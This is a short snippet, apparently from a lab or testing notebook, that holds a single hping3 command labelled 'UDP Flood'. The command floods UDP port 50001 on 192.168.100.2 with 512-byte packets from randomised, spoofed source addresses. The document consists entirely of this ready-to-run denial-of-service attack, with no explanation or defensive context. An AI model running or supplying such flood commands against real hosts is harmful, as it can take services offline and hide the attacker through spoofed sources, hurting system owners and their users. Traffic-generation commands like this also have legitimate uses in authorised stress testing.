# UDP Flood (512 bytes) (command)
sudo hping3 -2 192.168.100.2 -p 50001 --rand-source -d 512 --flood